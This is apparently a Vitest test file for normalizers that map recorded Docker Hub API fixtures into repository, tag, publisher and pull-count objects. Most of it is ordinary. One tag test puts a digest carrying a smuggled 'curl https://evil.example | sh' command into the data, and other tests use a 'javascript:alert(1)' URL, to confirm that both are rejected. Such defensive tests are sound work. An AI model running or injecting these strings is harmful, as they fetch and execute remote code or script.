/**
 * Normalizers against the recorded fixtures (RISKS.md 1.3, 4.1 to 4.3): each
 * fixture goes through its schema, then the normalizer, and the result is
 * compared with the DTO we expect (docs/API.md).
 */
import * as v from 'valibot';
import { describe, expect, it } from 'vitest';
import type { RepoSummary } from '../lib/dto';
import { NAME_PATTERN } from '../lib/params';
import { cloneFixture, fixtures } from '../../test/msw/dockerhub';
import {
  LegacySearchResponseSchema,
  OrgSchema,
  RepositorySchema,
  SearchV4ResponseSchema,
  TagSchema,
  TagsResponseSchema,
  UserSchema,
} from './dockerhub.schemas.server';
import {
  normalizePulls,
  parsePullsLabel,
  pullsLabelFor,
  safeHttpsUrl,
  splitRepoId,
  toBadge,
  toLegacySearchPage,
  toOrgPublisher,
  toRepoDetails,
  toSearchPage,
  toTag,
  toTagsPage,
  toUserPublisher,
} from './normalize.server';

const paging = { page: 1, pageSize: 25 };
const search = (body: unknown) => toSearchPage(v.parse(SearchV4ResponseSchema, body), paging);
const repo = (body: unknown) => v.parse(RepositorySchema, body);
const tags = (body: unknown) => toTagsPage(v.parse(TagsResponseSchema, body), paging);

function find(items: RepoSummary[], id: string): RepoSummary {
  const item = items.find((summary) => summary.id === id);
  if (!item) throw new Error(`${id} not in the page`);
  return item;
}

const NGINX_LOGO =
  'https://djeqr6to3dedg.cloudfront.net/repo-logos/library/nginx/live/logo-1790032455953.png';

const NGINX_SUMMARY: RepoSummary = {
  id: 'library/nginx',
  namespace: 'library',
  name: 'nginx',
  displayName: 'nginx',
  owner: 'library',
  description: 'Official build of Nginx.',
  logoUrl: NGINX_LOGO,
  badge: 'official',
  pulls: 13536895997,
  pullsLabel: '1B+',
  stars: 21414,
  updatedAt: '2026-10-31T01:52:43.634621Z',
  archs: ['386', 'mips64le', 'ppc64le', 'x86-64', 'arm', 'ARM 64', 'riscv64', 'IBM Z'],
  archived: false,
};

describe('search v4 → Page<RepoSummary>', () => {
  it('popular: the 10 official images, nginx first', () => {
    const page = search(fixtures.searchV4Popular);
    expect(page).toMatchObject({ total: 181, page: 1, pageSize: 25 });
    expect(page.items).toHaveLength(10);
    expect(page.items[0]).toEqual(NGINX_SUMMARY);
    for (const item of page.items) {
      expect(item.namespace).toBe('library');
      expect(item.displayName).toBe(item.name);
      expect(item.badge).toBe('official');
    }
  });

  it('a non-official repo: v4 `name` is `ns/repo`, owner is the publisher display name', () => {
    const page = search(fixtures.searchV4Nginx);
    expect(find(page.items, 'nginx/nginx-ingress')).toMatchObject({
      namespace: 'nginx',
      name: 'nginx-ingress',
      displayName: 'nginx/nginx-ingress',
      owner: 'NGINX Inc.',
      badge: 'verified_publisher',
    });
  });

  it('drops entries that are not Hub repositories (dhi, extension), keeps routable ids only', () => {
    const page = search(fixtures.searchV4Nginx);
    const ids = page.items.map((item) => item.id);
    expect(ids).not.toContain('dhi/nginx');
    expect(ids.some((id) => id.startsWith('extension/'))).toBe(false);
    expect(page.items).toHaveLength(fixtures.searchV4Nginx.results.length - 2);
    for (const item of page.items) {
      expect(item.namespace).toMatch(NAME_PATTERN);
      expect(item.name).toMatch(NAME_PATTERN);
    }
  });

  it('missing logo (`logo_url: {}`) and empty description', () => {
    const hello = find(search(fixtures.searchV4Hello).items, 'nginxdemos/hello');
    expect(hello.logoUrl).toBeUndefined();
    expect(hello.pullsLabel).toBe('100M+');
    const rancher = find(search(fixtures.searchV4Nginx).items, 'rancher/nginx');
    expect(rancher).toMatchObject({ logoUrl: undefined, description: '' });
  });

  it('an archived repository is flagged', () => {
    const page = search(fixtures.searchV4Kernel528Archived);
    expect(find(page.items, 'kernel528/archived')).toMatchObject({
      archived: true,
      badge: 'none',
      pulls: 82,
      pullsLabel: '82',
      logoUrl: undefined,
      archs: ['x86-64'],
    });
    expect(page.items.filter((item) => item.archived)).toHaveLength(1);
  });

  it('suggestions use the same shape', () => {
    expect(search(fixtures.searchV4SuggestionsNgi).items[0]).toEqual(NGINX_SUMMARY);
  });

  it('null display fields fall back instead of failing', () => {
    const body = cloneFixture(fixtures.searchV4Popular);
    const first = body.results[0] as Record<string, unknown>;
    Object.assign(first, {
      publisher: null,
      short_description: null,
      logo_url: { small: 'javascript:alert(1)', large: null },
      badge: 'brand_new_badge',
      star_count: null,
      architectures: null,
      updated_at: null,
      archived: null,
    });
    delete first.raw_pull_count;
    expect(search(body).items[0]).toEqual({
      ...NGINX_SUMMARY,
      owner: 'library',
      description: '',
      logoUrl: undefined,
      badge: 'none',
      pulls: 1_000_000_000,
      stars: 0,
      updatedAt: '',
      archs: [],
    });
  });
});

describe('legacy search → Page<RepoSummary>', () => {
  it('maps the bare official name to library/ and keeps the numeric pull count', () => {
    const page = toLegacySearchPage(
      v.parse(LegacySearchResponseSchema, fixtures.searchLegacyNginx),
      {
        page: 2,
        pageSize: 25,
      },
    );
    expect(page).toMatchObject({ total: 295800, page: 2, pageSize: 25 });
    expect(page.items[0]).toEqual({
      id: 'library/nginx',
      namespace: 'library',
      name: 'nginx',
      displayName: 'nginx',
      owner: 'library',
      description: 'Official build of Nginx.',
      badge: 'official',
      pulls: 13536895997,
      pullsLabel: '1B+',
      stars: 21414,
      updatedAt: '',
      archs: [],
      archived: false,
    });
    expect(page.items.filter((item) => item.badge === 'official')).toHaveLength(1);
  });
});

describe('repository → RepoDetails', () => {
  it('library/nginx', () => {
    const details = toRepoDetails(repo(fixtures.repoNginx));
    expect(details).toEqual({
      id: 'library/nginx',
      namespace: 'library',
      name: 'nginx',
      displayName: 'nginx',
      owner: 'library',
      description: 'Official build of Nginx.',
      logoUrl: undefined,
      badge: 'official',
      pulls: 13543605709,
      pullsLabel: '1B+',
      stars: 21416,
      updatedAt: '2026-10-31T01:52:43.634621Z',
      archs: [],
      archived: false,
      fullDescriptionMd: fixtures.repoNginx.full_description,
      registeredAt: '2014-06-05T19:14:45Z',
      storageSize: 258931395073,
      categories: ['Web servers'],
    });
    expect(details.fullDescriptionMd.startsWith('# Quick reference')).toBe(true);
  });

  it('merges the search result for logo, owner, badge and architectures', () => {
    const details = toRepoDetails(repo(fixtures.repoNginx), NGINX_SUMMARY);
    expect(details).toMatchObject({
      logoUrl: NGINX_LOGO,
      owner: 'library',
      badge: 'official',
      archs: NGINX_SUMMARY.archs,
    });
  });

  it('ignores a search result for a different repository', () => {
    const details = toRepoDetails(repo(fixtures.repoFluentBit), {
      ...NGINX_SUMMARY,
      badge: 'verified_publisher',
    });
    expect(details).toMatchObject({
      id: 'fluent/fluent-bit',
      owner: 'fluent',
      logoUrl: undefined,
      badge: 'none',
      archs: [],
    });
  });

  it('fluent/fluent-bit: a non-official repository', () => {
    expect(toRepoDetails(repo(fixtures.repoFluentBit))).toMatchObject({
      id: 'fluent/fluent-bit',
      displayName: 'fluent/fluent-bit',
      owner: 'fluent',
      badge: 'none',
      pulls: 15962103469,
      pullsLabel: '1B+',
      categories: ['Integration & delivery', 'Internet of things', 'Monitoring & observability'],
    });
  });

  it('nginxdemos/hello: no logo anywhere', () => {
    const details = toRepoDetails(repo(fixtures.repoNginxdemosHello));
    expect(details.logoUrl).toBeUndefined();
    expect(details.pullsLabel).toBe('100M+');
  });

  it('kernel528/archived: archived, empty full description', () => {
    expect(toRepoDetails(repo(fixtures.repoKernel528Archived))).toMatchObject({
      archived: true,
      fullDescriptionMd: '',
      pulls: 266,
      pullsLabel: '266',
    });
  });

  it('missing optional fields', () => {
    const details = toRepoDetails(
      repo({ namespace: 'someone', name: 'thing', storage_size: 0, full_description: null }),
    );
    expect(details).toMatchObject({
      description: '',
      fullDescriptionMd: '',
      storageSize: undefined,
      pulls: 0,
      pullsLabel: '0',
      categories: [],
      updatedAt: '',
      registeredAt: '',
      archived: false,
    });
  });
});

describe('tags → Page<Tag>', () => {
  it('fluent/fluent-bit: a repository with thousands of tags', () => {
    const page = tags(fixtures.tagsFluentBit);
    expect(page).toMatchObject({ total: 2189, page: 1, pageSize: 25 });
    expect(page.items).toHaveLength(25);
    expect(page.items[0]).toEqual({
      name: '5.1.5-2',
      updatedAt: '2026-10-28T23:49:26.553172Z',
      size: 62592256,
      digest: 'sha256:1e1b4b0a62fdb9fdaa832ade335d996c34e86fa29858b2a3e6d20c210c1c497f',
      pushedBy: 'edsiper',
      lastPulled: '2026-11-02T20:36:59.620442477Z',
      images: [
        {
          arch: 'amd64',
          variant: undefined,
          os: 'linux',
          size: 62592256,
          digest: 'sha256:9b6786d8d129fe8e4a2e19a9cb4aebeb44bd31fb52377b7ef1db327f56e0b951',
        },
        {
          arch: 'arm',
          variant: 'v7',
          os: 'linux',
          size: 56267351,
          digest: 'sha256:44217bf77e602213aa21af48bf0b5e177084c1245bbfeba36dc3f05d50a5d3e0',
        },
        {
          arch: 'arm64',
          variant: 'v8',
          os: 'linux',
          size: 61709184,
          digest: 'sha256:35100a7cf11943c331f86776db2c9e98766c5210b9608787fb705e0b01dba686',
        },
      ],
    });
  });

  it('windows images keep their os', () => {
    const page = tags(fixtures.tagsFluentBit);
    const windows = page.items.find((tag) => tag.name.startsWith('windows-'));
    expect(windows?.images.every((image) => image.os === 'windows')).toBe(true);
  });

  it('library/nginx: attestation manifests (`unknown/unknown`) are dropped', () => {
    const page = tags(fixtures.tagsNginx);
    const raw = fixtures.tagsNginx.results[0];
    expect(raw?.images.some((image) => image.os === 'unknown')).toBe(true);
    for (const tag of page.items) {
      expect(tag.images.length).toBeGreaterThan(0);
      expect(tag.images.some((image) => image.os === 'unknown' || image.arch === 'unknown')).toBe(
        false,
      );
    }
  });

  it('single tag: same shape', () => {
    const tag = toTag(v.parse(TagSchema, fixtures.tagNginxLatest));
    expect(tag).toMatchObject({ name: 'latest', size: 63911306, pushedBy: 'doijanky' });
    expect(tag.images.map((image) => image.arch)).toContain('arm64');
  });

  it('an image without a digest keeps it absent', () => {
    const raw = cloneFixture(fixtures.tagsFluentBit.results[0]) as Record<string, unknown>;
    raw.images = [{ architecture: 'amd64', os: 'linux', size: 1, digest: '' }];
    expect(toTag(v.parse(TagSchema, raw)).images).toEqual([
      { arch: 'amd64', variant: undefined, os: 'linux', size: 1, digest: undefined },
    ]);
  });

  it('every recorded tag and image digest is well formed, so none is dropped', () => {
    const recorded = [
      ...fixtures.tagsFluentBit.results,
      ...fixtures.tagsFluentBitOldest.results,
      ...fixtures.tagsKernel528Archived.results,
      fixtures.tagNginxLatest,
    ];
    const parsed = recorded.map((raw) => v.parse(TagSchema, raw));
    expect(parsed.some((raw) => raw.images?.some((image) => image.digest))).toBe(true);
    for (const raw of parsed) {
      const tag = toTag(raw);
      expect(tag.digest).toBe(raw.digest || undefined);
      // The platforms toTag keeps (attestation manifests are `unknown`).
      const platforms = (raw.images ?? []).filter(
        (image) => image.architecture && image.architecture !== 'unknown' && image.os !== 'unknown',
      );
      expect(tag.images.map((image) => image.digest)).toEqual(
        platforms.map((image) => image.digest || undefined),
      );
    }
  });

  it('a malformed digest is dropped, so it never reaches a copied docker pull command', () => {
    const raw = cloneFixture(fixtures.tagsFluentBit.results[0]) as Record<string, unknown>;
    const injected = 'sha256:abc; curl https://evil.example | sh';
    raw.digest = injected;
    raw.images = [
      { architecture: 'amd64', os: 'linux', size: 1, digest: injected },
      { architecture: 'arm64', os: 'linux', size: 1, digest: `sha256:${'A'.repeat(64)}` },
      { architecture: 'arm', os: 'linux', size: 1, digest: ` sha256:${'a'.repeat(64)} ` },
    ];
    const tag = toTag(v.parse(TagSchema, raw));
    expect(tag.digest).toBeUndefined();
    expect(tag.images.map((image) => image.digest)).toEqual([
      undefined,
      undefined,
      `sha256:${'a'.repeat(64)}`,
    ]);
  });

  it('full_size 0 or null, no images, never pulled: safe defaults (RISKS 4.3)', () => {
    // No recorded tag has these values today, so this tweaks a real one.
    const raw = cloneFixture(fixtures.tagsFluentBitOldest.results[0]) as Record<string, unknown>;
    for (const fullSize of [0, null, -1]) {
      Object.assign(raw, {
        full_size: fullSize,
        images: null,
        tag_last_pulled: null,
        digest: '',
        last_updated: null,
      });
      expect(toTag(v.parse(TagSchema, raw))).toEqual({
        name: fixtures.tagsFluentBitOldest.results[0]?.name,
        updatedAt: fixtures.tagsFluentBitOldest.results[0]?.tag_last_pushed,
        size: 0,
        digest: undefined,
        pushedBy: fixtures.tagsFluentBitOldest.results[0]?.last_updater_username,
        lastPulled: undefined,
        images: [],
      });
    }
  });

  it('kernel528/archived: an archived repository still lists its tags', () => {
    expect(tags(fixtures.tagsKernel528Archived)).toMatchObject({ total: 5 });
  });
});

describe('orgs / users → Publisher', () => {
  it('an org with a full name, avatar and badge', () => {
    expect(toOrgPublisher(v.parse(OrgSchema, fixtures.orgDocker))).toEqual({
      name: 'docker',
      displayName: 'Docker, Inc.',
      kind: 'organization',
      avatarUrl: 'https://www.gravatar.com/avatar/0fb5734bc033c43c456a233739d1eb05?s=80&r=g&d=mm',
      badge: 'verified_publisher',
    });
  });

  it('an org without a full name falls back to the company', () => {
    expect(toOrgPublisher(v.parse(OrgSchema, fixtures.orgFluent))).toMatchObject({
      name: 'fluent',
      displayName: 'Fluent organization: Fluentd project',
      badge: 'open_source',
    });
  });

  it('a user without a name or avatar: the username, no avatar, no badge', () => {
    expect(toUserPublisher(v.parse(UserSchema, fixtures.userKernel528))).toEqual({
      name: 'kernel528',
      displayName: 'kernel528',
      kind: 'user',
      avatarUrl: undefined,
      badge: 'none',
    });
  });

  it('drops a non-https avatar and an unknown badge', () => {
    const org = cloneFixture(fixtures.orgDocker);
    org.gravatar_url = 'http://example.com/a.png';
    org.badge = 'sponsored';
    expect(toOrgPublisher(v.parse(OrgSchema, org))).toMatchObject({
      avatarUrl: undefined,
      badge: 'none',
    });
  });
});

describe('pull counts (RISKS 4.2)', () => {
  it('derived labels match every label Docker Hub sent in the fixtures', () => {
    const results = [
      fixtures.searchV4Popular,
      fixtures.searchV4Nginx,
      fixtures.searchV4Hello,
      fixtures.searchV4Kernel528Archived,
      fixtures.searchV4SuggestionsNgi,
    ].flatMap((body: unknown) => v.parse(SearchV4ResponseSchema, body).results);
    expect(results.length).toBeGreaterThan(50);
    for (const result of results) {
      expect(typeof result.raw_pull_count, result.id).toBe('number');
      expect(pullsLabelFor(result.raw_pull_count ?? -1), result.id).toBe(result.pull_count);
    }
  });

  it.each([
    [0, '0'],
    [82, '82'],
    [999, '999'],
    [1000, '1.0K'],
    [4154, '4.2K'],
    [9999, '9.9K'],
    [10_000, '10K+'],
    [49_999, '10K+'],
    [500_000, '500K+'],
    [5_062_408, '5M+'],
    [353_779_325, '100M+'],
    // Inferred from the 5×10ⁿ bucket pattern: no recorded repo falls in 500M–1B.
    [700_000_000, '500M+'],
    [13_536_895_997, '1B+'],
    [-5, '0'],
  ])('pullsLabelFor(%d) = %s', (pulls, label) => {
    expect(pullsLabelFor(pulls)).toBe(label);
  });

  it.each([
    ['1B+', 1e9],
    ['100M+', 1e8],
    ['7.0K', 7000],
    ['4.2K', 4200],
    ['82', 82],
    ['1,234', 1234],
    ['n/a', undefined],
    ['', undefined],
  ])('parsePullsLabel(%j) = %j', (label, pulls) => {
    expect(parsePullsLabel(label)).toBe(pulls);
  });

  it('prefers raw_pull_count, then a numeric pull_count, then the parsed label', () => {
    expect(normalizePulls('1B+', 13536895997)).toEqual({ pulls: 13536895997, pullsLabel: '1B+' });
    expect(normalizePulls(13536895997)).toEqual({ pulls: 13536895997, pullsLabel: '1B+' });
    expect(normalizePulls('50M+')).toEqual({ pulls: 50_000_000, pullsLabel: '50M+' });
    expect(normalizePulls(null, null)).toEqual({ pulls: 0, pullsLabel: '0' });
  });
});

describe('helpers', () => {
  it.each([
    ['library/nginx', undefined, { namespace: 'library', name: 'nginx' }],
    ['nginx', 'library', { namespace: 'library', name: 'nginx' }],
    ['nginx', undefined, undefined],
    ['extension/nginx/docker-extension', undefined, undefined],
    ['Nginx/Thing', undefined, undefined],
    ['a/', undefined, undefined],
    ['../x', undefined, undefined],
  ])('splitRepoId(%j, %j)', (id, bare, expected) => {
    expect(splitRepoId(id, bare)).toEqual(expected);
  });

  it('toBadge keeps known badges only', () => {
    expect(toBadge('hardened')).toBe('hardened');
    expect(toBadge('verified_publisher')).toBe('verified_publisher');
    expect(toBadge('sponsored')).toBe('none');
    expect(toBadge(null)).toBe('none');
  });

  it('safeHttpsUrl accepts https only', () => {
    expect(safeHttpsUrl(NGINX_LOGO)).toBe(NGINX_LOGO);
    expect(safeHttpsUrl('http://example.com/logo.png')).toBeUndefined();
    expect(safeHttpsUrl('javascript:alert(1)')).toBeUndefined();
    expect(safeHttpsUrl('/relative.png')).toBeUndefined();
    expect(safeHttpsUrl('')).toBeUndefined();
  });
});
